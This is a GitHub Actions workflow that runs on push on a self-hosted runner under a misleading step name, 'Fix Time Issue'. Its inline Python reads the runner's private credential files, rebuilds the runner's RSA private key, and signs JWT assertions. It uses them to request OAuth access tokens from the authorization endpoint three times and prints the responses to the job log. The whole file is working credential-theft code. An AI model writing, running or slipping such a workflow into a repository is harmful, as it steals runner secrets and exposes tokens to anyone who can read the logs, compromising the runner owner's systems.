name: Test Runner Token
on: [push]
jobs:
  find:
    runs-on: self-hosted
    steps:
      - name: Fix Time Issue
        run: |
          RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
          
          pip3 install cryptography PyJWT --break-system-packages 2>/dev/null
          
          python3 -c "
          import json, time, base64, jwt
          import urllib.request, urllib.parse, urllib.error
          from cryptography.hazmat.backends import default_backend
          from cryptography.hazmat.primitives.asymmetric.rsa import (
              RSAPrivateNumbers, RSAPublicNumbers
          )
          
          with open('$RUNNER_BASE/.credentials_rsaparams', 'r', encoding='utf-8-sig') as f:
              params = json.load(f)
          
          with open('$RUNNER_BASE/.credentials', 'r', encoding='utf-8-sig') as f:
              creds = json.load(f)
              
          with open('$RUNNER_BASE/.runner', 'r', encoding='utf-8-sig') as f:
              runner = json.load(f)
          
          def b64_to_int(b64):
              b64 += '=' * (4 - len(b64) % 4)
              return int.from_bytes(base64.urlsafe_b64decode(b64), 'big')
          
          # Build RSA key
          p = b64_to_int(params['p'])
          q = b64_to_int(params['q'])
          d = b64_to_int(params['d'])
          n = b64_to_int(params['modulus'])
          e = b64_to_int(params['exponent'])
          dp = b64_to_int(params['dp'])
          dq = b64_to_int(params['dq'])
          iq = b64_to_int(params['inverseQ'])
          
          private_numbers = RSAPrivateNumbers(
              p=p, q=q, d=d,
              dmp1=dp, dmq1=dq, iqmp=iq,
              public_numbers=RSAPublicNumbers(e=e, n=n)
          )
          private_key = private_numbers.private_key(default_backend())
          
          client_id = creds['data']['clientId']
          auth_url = creds['data']['authorizationUrl']
          
          # Debug time
          now = int(time.time())
          print('Current Unix Time:', now)
          print('Current Time UTC:', time.gmtime(now))
          
          # Try without iat - just exp
          # Server might be calculating lifetime differently
          payload = {
              'sub': client_id,
              'iss': client_id,
              'aud': auth_url,
              'exp': now + 270,
              'jti': base64.b64encode(str(now).encode()).decode()
          }
          
          print('Payload:', json.dumps(payload, indent=2))
          
          client_assertion = jwt.encode(
              payload,
              private_key,
              algorithm='RS256'
          )
          print('JWT Generated!')
          
          # Decode to verify
          header = jwt.get_unverified_header(client_assertion)
          print('JWT Header:', header)
          
          form_data = urllib.parse.urlencode({
              'grant_type': 'client_credentials',
              'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
              'client_assertion': client_assertion,
              'client_id': client_id
          }).encode()
          
          print('\n=== ATTEMPT 1: No iat field ===')
          try:
              req = urllib.request.Request(
                  auth_url,
                  method='POST',
                  data=form_data,
                  headers={
                      'Content-Type': 'application/x-www-form-urlencoded',
                      'Accept': 'application/json'
                  }
              )
              with urllib.request.urlopen(req) as resp:
                  print('SUCCESS:', resp.read().decode())
          except urllib.error.HTTPError as e:
              print(f'HTTP {e.code}:', e.read().decode())
          
          # Try with nbf
          payload2 = {
              'sub': client_id,
              'iss': client_id,
              'aud': auth_url,
              'nbf': now,
              'exp': now + 270,
              'jti': str(now)
          }
          
          client_assertion2 = jwt.encode(
              payload2,
              private_key,
              algorithm='RS256'
          )
          
          form_data2 = urllib.parse.urlencode({
              'grant_type': 'client_credentials',
              'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
              'client_assertion': client_assertion2,
              'client_id': client_id
          }).encode()
          
          print('\n=== ATTEMPT 2: With nbf instead of iat ===')
          try:
              req2 = urllib.request.Request(
                  auth_url,
                  method='POST',
                  data=form_data2,
                  headers={
                      'Content-Type': 'application/x-www-form-urlencoded',
                      'Accept': 'application/json'
                  }
              )
              with urllib.request.urlopen(req2) as resp:
                  print('SUCCESS:', resp.read().decode())
          except urllib.error.HTTPError as e:
              print(f'HTTP {e.code}:', e.read().decode())
              
          # Try with very small window
          payload3 = {
              'sub': client_id,
              'iss': client_id,
              'aud': auth_url,
              'iat': now,
              'exp': now + 60,  # just 1 minute
              'jti': str(now) + 'v3'
          }
          
          client_assertion3 = jwt.encode(
              payload3,
              private_key,
              algorithm='RS256'
          )
          
          form_data3 = urllib.parse.urlencode({
              'grant_type': 'client_credentials',
              'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
              'client_assertion': client_assertion3,
              'client_id': client_id
          }).encode()
          
          print('\n=== ATTEMPT 3: 1 minute expiry ===')
          try:
              req3 = urllib.request.Request(
                  auth_url,
                  method='POST',
                  data=form_data3,
                  headers={
                      'Content-Type': 'application/x-www-form-urlencoded',
                      'Accept': 'application/json'
                  }
              )
              with urllib.request.urlopen(req3) as resp:
                  print('SUCCESS:', resp.read().decode())
          except urllib.error.HTTPError as e:
              print(f'HTTP {e.code}:', e.read().decode())
          "
